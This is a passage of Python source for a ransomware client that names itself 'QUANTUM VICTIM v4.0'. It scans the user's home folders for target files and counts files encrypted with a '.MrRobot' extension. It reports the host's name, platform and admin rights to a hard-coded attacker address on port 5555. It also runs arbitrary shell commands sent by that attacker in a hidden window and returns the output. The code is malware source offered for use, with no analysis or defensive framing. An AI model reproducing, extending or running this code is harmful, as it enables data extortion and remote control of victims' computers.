                        if filename.startswith('.') or filename.startswith('~$'):

                            continue

                        

                        # Check extension

                        _, ext = os.path.splitext(filename)

                        ext_lower = ext.lower()

                        

                        if ext_lower in self.target_extensions:

                            filepath = os.path.join(root, filename)

                            try:

                                # Skip very large files (>100MB)

                                if os.path.getsize(filepath) > 100 * 1024 * 1024:

                                    continue

                                

                                target_files.append(filepath)

                                file_count += 1

                                if ext_lower == '.txt':

                                    txt_count += 1

                            except:

                                continue

                                

            except Exception as e:

                print(f"  [-] Error scanning {scan_dir}: {e}")

                continue

        

        print(f"[+] Total found: {len(target_files)} files ({txt_count} TXT files)")

        return target_files

    

    def _find_encrypted_files(self):

        """Find encrypted files with .MrRobot extension"""

        encrypted_files = []

        

        # Search in common locations

        if os.name == 'nt':

            search_dirs = [

                os.path.expanduser('~\\Documents'),

                os.path.expanduser('~\\Desktop'),

                os.path.expanduser('~\\Downloads'),

                os.path.expanduser('~\\Pictures'),

                os.path.expanduser('~\\Music'),

                os.path.expanduser('~\\Videos'),

            ]

        else:

            search_dirs = [

                os.path.expanduser('~/Documents'),

                os.path.expanduser('~/Desktop'),

                os.path.expanduser('~/Downloads'),

                os.path.expanduser('~/Pictures'),

                os.path.expanduser('~/Music'),

                os.path.expanduser('~/Videos'),

            ]

        

        for search_dir in search_dirs:

            if not os.path.exists(search_dir):

                continue

            

            try:

                count = 0

                for root, dirs, files in os.walk(search_dir):

                    for filename in files:

                        if filename.endswith('.MrRobot'):

                            filepath = os.path.join(root, filename)

                            encrypted_files.append(filepath)

                            count += 1

                

                if count > 0:

                    print(f"  [+] Found {count} .MrRobot files in {search_dir}")

                    

            except:

                continue

        

        print(f"[+] Total .MrRobot files found: {len(encrypted_files)}")

        return encrypted_files

    

    def _handle_scan(self, command):

        """Handle scan command"""

        print(f"\n{'='*60}")

        print("[+] Scanning system...")

        print(f"{'='*60}")

        

        try:

            locations = ["documents", "desktop", "downloads", "pictures", "music", "videos"]

            

            results = {

                "target_files": 0,

                "encrypted_files": 0,

                "txt_files": 0,

                "txt_encrypted": 0,

                "locations": {}

            }

            

            for location in locations:

                target_files = self._find_target_files(location)

                encrypted_files = self._find_encrypted_files()

                

                txt_files = len([f for f in target_files if f.lower().endswith('.txt')])

                txt_encrypted = len([f for f in encrypted_files if f.lower().replace('.MrRobot', '').endswith('.txt')])

                

                results["locations"][location] = {

                    "target_files": len(target_files),

                    "txt_files": txt_files,

                    "encrypted_files": len(encrypted_files),

                    "txt_encrypted": txt_encrypted

                }

                

                results["target_files"] += len(target_files)

                results["txt_files"] += txt_files

                results["encrypted_files"] += len(encrypted_files)

                results["txt_encrypted"] += txt_encrypted

            

            response = {

                "type": "scan_result",

                "results": results,

                "victim_id": self.victim_id,

                "timestamp": time.time()

            }

            

            self._send_json(response)

            

            print(f"\n[+] SCAN COMPLETE:")

            print(f"    {'='*50}")

            print(f"    Target files: {results['target_files']}")

            print(f"    TXT files: {results['txt_files']}")

            print(f"    .MrRobot files: {results['encrypted_files']}")

            print(f"    TXT encrypted: {results['txt_encrypted']}")

            print(f"    {'='*50}")

            

        except Exception as e:

            print(f"[-] Scan error: {e}")

            traceback.print_exc()

            error_response = {

                "type": "error",

                "error": f"Scan failed: {str(e)}",

                "timestamp": time.time()

            }

            self._send_json(error_response)

    

    def _handle_status(self, command):

        """Handle status command"""

        try:

            # Get encrypted files

            encrypted_files = self._find_encrypted_files()

            txt_encrypted = len([f for f in encrypted_files if f.lower().replace('.MrRobot', '').endswith('.txt')])

            

            # Get admin status

            admin_status = False

            if platform.system() == 'Windows':

                try:

                    import ctypes

                    admin_status = ctypes.windll.shell32.IsUserAnAdmin() != 0

                except:

                    pass

            

            status = {

                "victim_id": self.victim_id,

                "hostname": socket.gethostname(),

                "platform": platform.system(),

                "admin_privileges": admin_status,

                "python_version": sys.version.split()[0],

                "crypto_available": self.encryption_engine.crypto_available,

                "encrypted_files": len(encrypted_files),

                "txt_encrypted": txt_encrypted,

                "target_extensions": len(self.target_extensions),

                "txt_included": '.txt' in self.target_extensions,

                "encrypted_extension": ".MrRobot",

                "timestamp": time.time()

            }

            

            response = {

                "type": "status",

                "status": status,

                "timestamp": time.time()

            }

            

            self._send_json(response)

            

            print(f"\n[+] Status information sent")

            print(f"[+] Admin privileges: {'YES' if admin_status else 'NO'}")

            

        except Exception as e:

            print(f"[-] Status error: {e}")

            traceback.print_exc()

            error_response = {

                "type": "error",

                "error": f"Status failed: {str(e)}",

                "timestamp": time.time()

            }

            self._send_json(error_response)

    

    def _execute_command(self, command):

        """Execute shell command"""

        cmd = command.get("command", "")

        

        if not cmd:

            return

        

        print(f"\n[+] Executing: {cmd}")

        

        try:

            if os.name == 'nt':

                process = subprocess.Popen(

                    cmd,

                    shell=True,

                    stdout=subprocess.PIPE,

                    stderr=subprocess.PIPE,

                    stdin=subprocess.PIPE,

                    text=True,

                    creationflags=subprocess.CREATE_NO_WINDOW

                )

            else:

                process = subprocess.Popen(

                    cmd,

                    shell=True,

                    stdout=subprocess.PIPE,

                    stderr=subprocess.PIPE,

                    stdin=subprocess.PIPE,

                    text=True

                )

            

            stdout, stderr = process.communicate(timeout=60)

            

            output = ""

            if stdout:

                output += stdout

            if stderr:

                if output:

                    output += "\n"

                output += "[ERROR]\n" + stderr

            

            response = {

                "type": "command_output",

                "command": cmd,

                "output": output,

                "success": process.returncode == 0,

                "return_code": process.returncode,

                "timestamp": time.time()

            }

            

            self._send_json(response)

            

        except subprocess.TimeoutExpired:

            response = {

                "type": "command_output",

                "command": cmd,

                "output": "[TIMEOUT] Command exceeded 60 seconds",

                "success": False,

                "timestamp": time.time()

            }

            self._send_json(response)

            

        except Exception as e:

            response = {

                "type": "command_output",

                "command": cmd,

                "output": f"[ERROR] {str(e)}",

                "success": False,

                "timestamp": time.time()

            }

            self._send_json(response)

    

    def cleanup(self):

        """Cleanup resources"""

        self.running = False

        if self.socket:
            try:
                self.socket.close()
            except:
                pass

        print("\n[+] Victim shutdown complete")

def main():
    """Main function"""
    # Print mask
    print(MASK)
    print(f"\n{'='*80}")
    print("QUANTUM VICTIM v4.0 - RSA/AES ENCRYPTION")
    print("="*80)
    
    # Configuration
    ATTACKER_IP = "192.168.174.133"  # Default attacker IP
    ATTACKER_PORT = 5555
    
    # Allow command line arguments
    if len(sys.argv) >= 2:
        ATTACKER_IP = sys.argv[1]
    if len(sys.argv) >= 3:
        ATTACKER_PORT = int(sys.argv[2])
    
    print(f"[+] Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
    print(f"[+] Starting victim client...")
    print(f"{'='*80}")
    
    victim = QuantumVictim(
        attacker_ip=ATTACKER_IP,
        attacker_port=ATTACKER_PORT
    )
    victim.connect()
    
if __name__ == "__main__":
    # Check for required packages
    try:
        import Cryptodome
    except ImportError:
        print("[!] pycryptodome not installed. Installing...")
        import subprocess
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
            print("[+] pycryptodome installed successfully")
        except:
            print("[!] Failed to install pycryptodome. Some features may not work.")

    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Victim stopped by user")
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        traceback.print_exc()
